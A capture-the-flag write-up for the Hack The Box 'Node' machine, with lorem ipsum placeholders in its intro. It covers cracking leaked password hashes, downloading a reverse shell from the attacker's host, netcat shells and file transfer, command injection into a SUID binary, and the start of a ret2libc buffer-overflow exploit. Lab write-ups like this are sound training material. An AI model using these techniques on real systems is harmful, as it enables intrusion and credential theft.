---
layout: single
title: Node - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-03-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-node/node_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-node/node_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. [p3:/git/htb/node]$ nmap -Pn -n -sCV 10.10.10.58 --open                                                                                             (master✱)
  PORT     STATE SERVICE            VERSION
  22/tcp   open  ssh                OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey:
  |   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)
  |   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)
  |_  256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)
  3000/tcp open  hadoop-tasktracker Apache Hadoop
  | hadoop-datanode-info:
  |_  Logs: /login
  | hadoop-tasktracker-info:
  |_  Logs: /login
  |_http-title: MyPlace
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


2. We find a login portal, not susceptible to SQLi. Looking through the debugger we find a lot of .js files;
   admin.js, home.js, login.js, profile.js, app.js

In app.js we find a few interesting paths;
  var controllers = angular.module('controllers', []);
  var app = angular.module('myplace', [ 'ngRoute', 'controllers' ]);

  app.config(function ($routeProvider, $locationProvider) {
    $routeProvider.
      when('/', {
        templateUrl: '/partials/home.html',
        controller: 'HomeCtrl'
      }).
      when('/profiles/:username', {
        templateUrl: '/partials/profile.html',
        controller: 'ProfileCtrl'
      }).
      when('/login', {
        templateUrl: '/partials/login.html',
        controller: 'LoginCtrl'
      }).
      when('/admin', {
        templateUrl: '/partials/admin.html',
        controller: 'AdminCtrl'
      }).
      otherwise({
        redirectTo: '/'
      });

      $locationProvider.html5Mode(true);
  });


If we look further on /partials/admin.html we see that admins have the option to Download Backup.

git/htb/node]$ curl http://10.10.10.58:3000/partials/admin.html                                                                                (master✱)
  --- snip ---
      <p>
        Only admin users have access to the control panel currently, but check back soon to test the standard user functionality!
      </p>
    </div>
    <div ng-if="user.is_admin">
      <button class="btn btn-large btn-primary" ng-click="backup()">Download Backup</button>
  --- snip ---

In profile.js we find the line '$http.get('/api/users/' + $routeParams.username)', curl /api/users to see if we can extract anything.

  [p3:/git/htb/node]$ curl http://10.10.10.58:3000/api/users                                                                                          (master✱)
    [{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},
    {"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},
    {"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},
    {"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]


3. Crack the hashes with hashcat / crackstation.net

[p3:/git/htb/node]$ hashcat -a0 -m1400 hashes.txt /usr/share/wordlists/rockyou.txt
  --- snip ---
  f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240:spongebob
  dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af:manchester
  de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73:snowflake

We have three sets of creds;
myP14ceAdm1nAcc0uNT:manchester  (admin)
tom:spongebob
mark:snowflake

Login with the admin account, and download the backup file.

[p3:/git/htb/node]$ strings myplace.backup| base64 --decode > out
[p3:/git/htb/node]$ file -b out                                                                                                                    (master✱)
  Zip archive data, at least v1.0 to extract
[p3:/git/htb/node]$ sudo mv out out.zip


The zip file is password protected, trying the previous known passwords don't work.
To crack the zip file we use fcrackzip.

[p3:/git/htb/node]$ fcrackzip -u -v -D -p /usr/share/wordlists/rockyou.txt out.zip                                                                 (master✱)
  'var/www/myplace/' is not encrypted, skipping
  found file 'var/www/myplace/package-lock.json', (size cp/uc   4404/ 21264, flags 9, chk 0145)
  'var/www/myplace/node_modules/' is not encrypted, skipping
  'var/www/myplace/node_modules/serve-static/' is not encrypted, skipping
  found file 'var/www/myplace/node_modules/serve-static/README.md', (size cp/uc   2733/  7508, flags 9, chk 1223)
  found file 'var/www/myplace/node_modules/serve-static/index.js', (size cp/uc   1640/  4533, flags 9, chk b964)
  found file 'var/www/myplace/node_modules/serve-static/LICENSE', (size cp/uc    697/  1189, flags 9, chk 1020)
  found file 'var/www/myplace/node_modules/serve-static/HISTORY.md', (size cp/uc   2625/  8504, flags 9, chk 35bd)
  found file 'var/www/myplace/node_modules/serve-static/package.json', (size cp/uc    868/  2175, flags 9, chk 0145)
  'var/www/myplace/node_modules/utils-merge/' is not encrypted, skipping
  found file 'var/www/myplace/node_modules/utils-merge/README.md', (size cp/uc    344/   634, flags 9, chk 9f17)
  found file 'var/www/myplace/node_modules/utils-merge/index.js', (size cp/uc    219/   381, flags 9, chk 9e03)
  8 file maximum reached, skipping further files

  PASSWORD FOUND!!!!: pw == magicword


4. Unzip the backup file, with password 'magicword'.

  [p3:/git/htb/node]$ sudo unzip -P magicword out.zip -d backup                                                                                      (master✱)
    Archive:  out.zip

  [p3:...node/backup/var/www/myplace]$ cat app.js
    --- snip ---
    const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';

We find a new sets of (SSH) creds! mark:5AYRft73VtFpc84k


5. Once logged in as mark we don't get user.txt. Looking in /home we find three users;

- frank
- mark
- tom (got user.txt)

We see that port 27017 is running locally. Further investigating it shows it's mongodb.

  [+] Active Ports
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
  Active Internet connections (servers and established)
  Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
  tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -

We can extract the contents with 'mongodump' however we only find the users and hashes that we already had.
  mark@node:/dev/shm$ mongodump -d myplace -u mark -p 5AYRft73VtFpc84k
    2021-03-10T20:31:02.004+0000	writing myplace.users to
    2021-03-10T20:31:02.006+0000	done dumping myplace.users (4 documents)

After being stuck here for a good while, i noticed that user Tom runs two services;
  mark@node:/dev/shm/dump/scheduler$ ps aux | grep tom
    tom       1230  0.0  5.2 1008568 39940 ?       Ssl  17:07   0:03 /usr/bin/node /var/scheduler/app.js
    tom       1236  0.0  6.4 1028912 48780 ?       Ssl  17:07   0:07 /usr/bin/node /var/www/myplace/app.js

/var/www/myplace/app.js we already know about, it was here we got our creds, but /var/scheduler/app.js is new.

  mark@node:/dev/shm/dump/scheduler$ cat /var/scheduler/app.js
    --- snip ---
    const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler';

We find a new database, scheduler.


6. Exploit the mongo service.

With the 'insert'-commands (insert, insertOne, insertMany) we can insert a file to be processed by the database.
The means that we can upload a reverse shell, and execute it as user tom (as he is running the mongo service).

  mark@node:/dev/shm$ wget http://10.10.14.11:8888/rev.js

  mark@node:/dev/shm$ mongo scheduler -u mark -p 5AYRft73VtFpc84k
    MongoDB shell version: 3.2.16
    connecting to: scheduler
    > show collections
      tasks
    > db.tasks.insertOne({cmd:"/usr/bin/node /dev/shm/rev.js"});
      {
      	"acknowledged" : true,
      	"insertedId" : ObjectId("604b3e15d2e31be023d70272")
      }

  [p3:/git/htb/solidstate]$ nc -lvnp 4488                                                                                                             (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.11] from (UNKNOWN) [10.10.10.58] 44652
    id
      uid=1000(tom) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin)
    cat ~/user.txt
      e1156acc3574e04b06908ecf76be91b1


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝




1. As we saw from our 'id'-command, we are a part of the groups 'adm' and 'sudo' - so as usual we run 'sudo -l'.

  tom@node:/dev/shm$ sudo -l
    [sudo] password for tom:

We don't know tom's password, so this is a dead end.
Upload and run linpeas.sh to find another attack vector.

  ====================================( Interesting Files )=====================================
  [+] SUID - Check easy privesc, exploits and write perms
  [i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
  --- snip ---
  -rwsr-xr-- 1 root   admin       17K Sep  3  2017 /usr/local/bin/backup
    --- It looks like /usr/local/bin/backup is executing /etc and you can impersonate it (strings line: /etc) (https://tinyurl.com/suidpath)
    --- It looks like /usr/local/bin/backup is executing /root and you can impersonate it (strings line: /root) (https://tinyurl.com/suidpath)
    --- It looks like /usr/local/bin/backup is executing time and you can impersonate it (strings line: time) (https://tinyurl.com/suidpath)
    --- Trying to execute /usr/local/bin/backup with strace in order to look for hijackable libraries...

/usr/local/bin/backup is owned by root, and group admin. If we run the binary, nothing happens (that we can see).
Running strings on the file gives us a clue on what's going on.

tom@node:~$ strings /usr/local/bin/backup
  --- snip ---
               ____________________________________________________
              /                                                    \
             |    _____________________________________________     |
             |   |                                             |    |
             |   |             Secure Backup v1.0              |    |
             |   |_____________________________________________|    |
             |                                                      |
              \_____________________________________________________/
                     \_______________________________________/
                  _______________________________________________
               _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
            _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
         _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
       _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
     _-'.-.-.-.-.-. .---.-. .-----------------------------. .-.---. .---.-.-.-.`-_
    :-----------------------------------------------------------------------------:
    `---._.-----------------------------------------------------------------._.---'
  Could not open file
  Validated access token
  Ah-ah-ah! You didn't say the magic word!
  Finished! Encoded backup is below:
  UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
  /root
  /etc
  /tmp/.backup_%i
  /usr/bin/zip -r -P magicword %s %s > /dev/null
  /usr/bin/base64 -w0 %s
  The target path doesn't exist
  ;*2$"
  GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609

The base64 code is just a trollface. We can't really investigate the binary further, so transfer the file to your local machine.

  [p3:/git/htb/node]$ sudo nc -lp 4400 > backup
  tom@node:/usr/local/bin$ nc -w 3 10.10.14.11 4400 < backup


2. If I'm reading the code correct, the binary zips /root and /etc, password protects the zip and then throws it to
   /dev/null. Maybe we can Buffer overflow to grab the files before thrown away?

   Tring when trying to execute the file we get no output at all. To understand how to use it, we must look back at
   /var/www/myplace/app.js;

  tom@node:/$ cat /var/www/myplace/app.js | grep backup
    const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
      --- snip ---
          var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
          --- snip ---


From the code we find a key, and how to execute the binary. Lets try to backup /root/root.txt.

  tom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root/root.txt
   [+] Finished! Encoded backup is below:

  UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==

We can see directly that the base64 is the same that we got from our strings, a trollface.


3. Instead of using the directory name, we can use wildcard symbols to circumvent the trollface.
  tom@node:/dev/shm$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt
  UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWWiTS2B1eAsAAQQAAAAABAAAAABBCIGHDmC+vo6OEZe88xXpB8P2VOruMCMNUzPVliowYtBD5ucJ7jLiDVnjEqJQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA

Decode the base64 and write it to a file, unzip with password 'magicword' and grab flag.
  [root:/git/htb/node]# unzip -P magicword root.zip                                                                                 (master✱)
    Archive:  root.zip
     extracting: root/root.txt

  [root:/git/htb/node]# cat root/root.txt                                                                                           (master✱)
    1722e99ca5f353b362556a62bd5e6be0


BONUS:
1) Code injection
tom@node:/usr/local/bin$ backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $'\n /bin/sh \n echo OK'

    zip error: Nothing to do! (/tmp/.backup_287397083)
  # whoami
    root
  # cat /root/root.txt
    1722e99ca5f353b362556a62bd5e6be0

2) Bypassing '/root' blacklist by standing in / and just writing 'root'
tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 root |base64 -d > tmp/root.zip
tom@node:/$ cd tmp
tom@node:/$ unzip -P magicword root.zip
Archive:  root.zip
   creating: root/
  inflating: root/.profile
  inflating: root/.bash_history
   creating: root/.cache/
 extracting: root/.cache/motd.legal-displayed
 extracting: root/root.txt
  inflating: root/.bashrc
  inflating: root/.viminfo
   creating: root/.nano/
 extracting: root/.nano/search_history
tom@node:/$ cat tmp/root/root.txt
  1722e99ca5f353b362556a62bd5e6be0


BONUS BUFFER OVERFLOW:

1. Trying to execute ./backup locally gives us the error ' [!] Could not open file'. If we investigate this with ltrace
we can see that it tries to open /etc/myplace/keys.

[root:/git/htb/node]# ltrace ./backup 1 2 3
  --- snip ---
  fopen("/etc/myplace/keys", "r")                                                        = 0
  strcpy(0xffe4c358, "Could not open file\n\n")                                          = 0xffe4c358


View the file on the victim, and copy it over to our local box.
tom@node:/$ cat /etc/myplace/keys
  a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508
  45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474
  3de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110
[root:/git/htb/node]# mkdir /etc/myplace                                                                                          (master✱)
[root:/git/htb/node]# vim /etc/myplace/keys

Now if we try the binary (without the quite operator -q), we get something to work with.
[root:/git/htb/node]# ./backup 1 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 testasdf
  --- snip ---
  [+] Validated access token
  [+] Starting archiving testis
  [!] The target path doesn't exist


2. Check the security of the file.

[root:/git/htb/node]# gdb ./backup

gef➤  checksec
[+] checksec for '/git/htb/node/backup'
Canary                        : ✘
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial

Next we need to find the point where the program craches. Start by creating a random length payload:
gef➤  pattern create 550
  [+] Generating a pattern of 550 bytes
  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma

Execute the program with the payload:
gef➤  r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma
  --- snip ---
  $ebp   : 0x66616163 ("caaf"?)
  --- snip ---
  ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
  0xffffc100│+0x0000: 0xffffd4b0  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"	 ← $esp
  --- snip ---
  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
  [#0] Id 1, Name: "backup", stopped 0x616164 in ?? (), reason: SIGSEGV

From the output ebp indicates where the program crached. We can quickly look up exactly where value "caaf" is:
gef➤  pattern offset caaf
  [+] Searching 'caaf'
  [+] Found at offset 220 (little-endian search) likely
  [+] Found at offset 508 (big-endian search)

The offset is said to be 508. We can prove this by creating a new pattern of 508, followed by 4 specified characters and
verify that they are set as esp value.

gef➤  pattern create 508
  [+] Generating a pattern of 508 bytes
  aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaa

gef➤  r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafBBBB
  --- snip ---
  0xffffbf84│+0x0000: "BBBB"	 ← $esp
  --- snip ---
  ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
  [#0] Id 1, Name: "backup", stopped 0xf7e5dd9d in ?? (), reason: SIGSEGV

It's verified, the offset (or buffer size) is 508 byte.


3. Next, find all addresses needed to form an exploit.

List libraries loaded within the binary using "ldd":

tom@node:/usr/local/bin$ ldd backup
	linux-gate.so.1 =>  (0xf7717000)
	libc.so.6 => /lib32/libc.so.6 (0xf7558000)
	/lib/ld-linux.so.2 (0xf7718000)

Libc address: 0xf7558000

Next, search for the system address within libc.so.6 using "readelf":
tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep system
readelf -s /lib32/libc.so.6 | grep system
   245: 00110820    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0
   627: 0003a940    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE
  1457: 0003a940    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0

System address: 0003a940

Search to see if there's an exit instruction:
tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep exit
   112: 0002eba0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10
   141: 0002e7b0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
   450: 0002ebd0   181 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18
   558: 000af578    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0
   616: 00113840    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0
   652: 0002eb80    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10
   876: 0002e9d0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3
  1046: 0011d290    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0
  1394: 001b0204     4 OBJECT  GLOBAL DEFAULT   32 argp_err_exit_status@@GLIBC_2.1
  1506: 000f19a0    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0
  2108: 001b0154     4 OBJECT  GLOBAL DEFAULT   32 obstack_exit_failure@@GLIBC_2.0
  2263: 0002e7d0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0
  2406: 000f2db0     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2

Exit address: 0002e7b0

Next we need to find any instruction for executing a command, like "bash,sh etc...", we do this using strings:
tom@node:/dev/shm$ strings -tx /lib32/libc.so.6 | grep "/bin"
 15900b /bin/sh
 15ab8c /bin/csh
 15bf70 /etc/bindresvport.blacklist
 15e84c /bin:/usr/bin

/bin/sh address: 15900b


4. Download a skelleton exploit and import our variables.
[root:/git/htb/node]# cat bof.py                                                                                                  (master✱)
import struct, subprocess

#bufferSize = 508                      # gdb -> pattern create/offset
libc_base_addr = 0xf7558000            # ldd /usr/local/bin/backup
system_off = 0x0003a940                # readelf -s /lib32/libc.so.6 | grep system
